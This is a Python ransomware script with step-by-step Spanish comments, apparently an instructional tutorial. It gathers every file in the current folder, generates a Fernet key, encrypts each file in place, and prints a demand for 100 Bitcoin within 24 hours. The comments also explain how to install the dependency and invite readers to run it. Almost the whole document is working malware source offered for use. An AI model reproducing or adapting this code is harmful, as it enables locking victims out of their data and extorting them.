# Estos son comentarios en Python, estaré utilizandolos para explicar todo el proceso.

# Primero debemos importar algunas librerías que necesitaremos. 

# Librería con funciones del sistema operativo que usaremos para encontrar los archivos en las carpetas.
import os 

# Fernet garantiza que un mensaje cifrado con él no puede ser manipulado o leído sin la clave. 
# Fernet es una implementación de criptografía simétrica (también conocida como "clave secreta") autentificada.
from cryptography.fernet import Fernet
# Para contar con esta librería debemos instalarla, vaya a la terminal del sistema operativo y escriba los siguiente: pip3 install cryptography
# pip es un instalador de paquetes para python que estará disponible si ya tiene instalado Python3.
# Si les da error a la hora de ejecutar el ransomware, es porque deben contar con esta librería primero.

# Ahora debemos encontrar los documentos encriptar en la carpeta y agregarlos a una lista
# Esta será nuestra lista:
files = [ ]

# Vamos a utilizar un for para recorrer la carpeta y agregar los archivos a la lista que ya creamos:
for file in os.listdir():
	
	# Como nuestro archivo ransomware se encuentra en la misma carpeta, debemos validar que el 
	# archivo que estamos añadiendo a la lista no sea nuestro propio malware. Además de validar que el 
	# archivo no sea nuestra llave de encripción que se genera más adelante en este mismo código ni el archivo que funciona para recuperar la información.
	if file == "ransomware.py" or file == "thekey.key" or file == "decrypt.py":

		continue

	# También debemos validar que únicamente estemos añadiendo archivos y no carpetas.
	if os.path.isfile(file):

		#En caso que el archivo no sea nuestro Malware o una carpeta, entonces el archivo se añade a la lista files[ ] que ya creamos desde el inicio.
		files.append(file) 

#Vamos a crear la clave con la que vamos a encriptar los archivos.
key = Fernet.generate_key() 

#Necesitamos guardar esta clave en un archivo. En este momento solo existe como variable, por lo tanto debemos guardarla de la siguiente forma:

with open ("thekey.key", "wb") as thekey:
	thekey.write(key)


# Ya que tenemos nuestra lista de archivos y nuestra llave de encripción, VAMOS A DIVERTIRNOS UN POCO

# Recorremos la lista para encriptar todos los archivos
for file in files:

	# Primero se abren los archivos en modo lectura, para extraer el contenido en una variable
	with open(file, "rb") as thefile:

		contents = thefile.read()
	#Se encripta el contenido de la variable con la función de Fernet	
	contents_encrypted = Fernet(key).encrypt(contents)

	# Se abren los archivos en modo escritura para guardar el contenido ya encriptado
	with open(file, "wb") as thefile:
		thefile.write(contents_encrypted)

# Mostramos el mensaje en el que solicitamos la recompensa por la información encriptada.
print ("Todos los archivos han sido encriptados, envíame 100 Bitcoin en las siguientes 24 horas o nunca recuperarás tu información")

# LISTO, ya tenemos los archivos de texto encriptados en la carpeta de pruebas que creamos.
# No me creen? ejecuten este código y vayan a abrir los archivos de texto que crearon previamente.
